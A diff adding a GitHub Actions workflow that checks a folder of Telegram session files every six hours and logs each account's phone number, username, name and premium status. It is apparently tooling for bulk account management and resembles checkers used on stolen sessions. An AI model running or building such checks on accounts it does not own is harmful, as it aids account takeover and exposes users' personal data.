@@ -1,0 +1,63 @@
+name: session-check
+
+on:
+  schedule:
+    - cron: "0 */6 * * *"
+  workflow_dispatch:
+
+concurrency:
+  group: session-check
+  cancel-in-progress: true
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      API_ID: ${{ secrets.API_ID }}
+      API_HASH: ${{ secrets.API_HASH }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install deps
+        run: |
+          pip install --upgrade pip
+          pip install telethon python-socks python-dotenv aiohttp aiohttp-socks
+      - name: Probe sessions
+        run: |
+          python - <<'EOF'
+          import asyncio, os, re
+          from pathlib import Path
+          from telethon import TelegramClient
+
+          api_id = int(os.environ["API_ID"])
+          api_hash = os.environ["API_HASH"]
+          sessions = sorted(Path("sessions").glob("*.session"))
+
+          async def check(sp):
+              name = sp.stem
+              client = TelegramClient(str(sp.with_suffix("")), api_id, api_hash)
+              try:
+                  await asyncio.wait_for(client.connect(), timeout=20)
+                  if not await client.is_user_authorized():
+                      print(f"[CHECK] DEAD  {name}  not authorized", flush=True)
+                      return
+                  me = await client.get_me()
+                  prem = "premium" if getattr(me, "premium", False) else "free"
+                  print(f"[CHECK] ALIVE {name}  phone={me.phone} user=@{me.username} name={me.first_name} tier={prem}", flush=True)
+              except Exception as e:
+                  print(f"[CHECK] ERROR {name}  {type(e).__name__}: {e}", flush=True)
+              finally:
+                  try:
+                      await client.disconnect()
+                  except Exception:
+                      pass
+
+          async def main():
+              for sp in sessions:
+                  await check(sp)
+
+          asyncio.run(main())
+          EOF
